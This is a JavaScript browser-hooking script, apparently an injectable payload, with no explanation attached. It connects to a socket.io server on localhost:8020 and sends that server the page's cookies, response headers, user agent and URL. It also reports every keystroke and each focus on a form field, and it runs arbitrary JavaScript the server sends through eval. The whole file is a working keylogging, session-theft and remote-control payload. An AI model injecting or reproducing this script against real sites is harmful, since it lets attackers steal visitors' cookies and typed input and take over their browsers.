window.f = function(a) {
    return console.log(a);
};

/* globals io */
(function(){
    var id;

    function loadScript(url, callback) {
        // Adding the script tag to the head as suggested before
        var head = document.getElementsByTagName('head')[0];
        var script = document.createElement('script');
        script.type = 'text/javascript';
        script.src = url;

        // Then bind the event to the callback function.
        // There are several events for cross browser compatibility.
        script.onreadystatechange = callback;
        script.onload = callback;

        // Fire the loading
        head.appendChild(script);
    }

    function loadAllScripts() {
        loadScript('http://localhost:8020/socket.io/socket.io.js', init);
    }

    function spyOnKeyDown(socket) {
        document.onkeydown = function (e) {
            e = e || window.event;

            socket.emit('update', {
                type: 'type',
                msg: e.keyCode,
                id: id
            });
        };
    }

    function fetchSimilarHeaders (callback) {
        var request = new XMLHttpRequest();
        request.onreadystatechange = function () {
            if (request.readyState === 4) {
                if (callback && typeof callback === 'function') {
                    callback(request.getAllResponseHeaders());
                }
            }
        };
        request.open('HEAD', document.location, true);
        request.send(null);
    }


    function spyOnFieldFocus(socket) {
        var inputFields = document.querySelectorAll('input,textarea'),
            fieldName = function(field) {
                if (field.id) {
                    return '#' + field.id;
                }
                if (field.className) {
                    return '.' + field.className;
                }
                return '[' + field.type + ']';
            },
            emitChange = function() {
                socket.emit('update', {
                    type: 'element-change',
                    msg: fieldName(this),
                    id: id
                });
            };

        for (var i = 0; i < inputFields.length; i++) {
            var field = inputFields[i];
            field.onfocus = emitChange;
        }
    }

    function listenToRemoteJs(socket) {
        socket.on('runRemoteJs', function(js) {
            eval(js);
        });
    }

    function idLoad(socket) {
        socket.on('id', function(ids) {
            id = ids;
        });
    }

    function start (id, headers, socket) {
        f(id);
        socket.emit('start', {
            ua: navigator.userAgent,
            headers: headers,
            cookies: document.cookie,
            title: document.title,
            url: location.href,
            socket_id: id
        });
    }

    function init() {
        var socket = io('http://localhost:8020/');


        idLoad(socket);
        fetchSimilarHeaders(function (headers) {
            socket.on('startID', function(start_id) {
                f(start_id)
                start(start_id, headers, socket);
                spyOnKeyDown(socket);
                spyOnFieldFocus(socket);
                listenToRemoteJs(socket);
            });
        });
    }

    loadAllScripts();

}());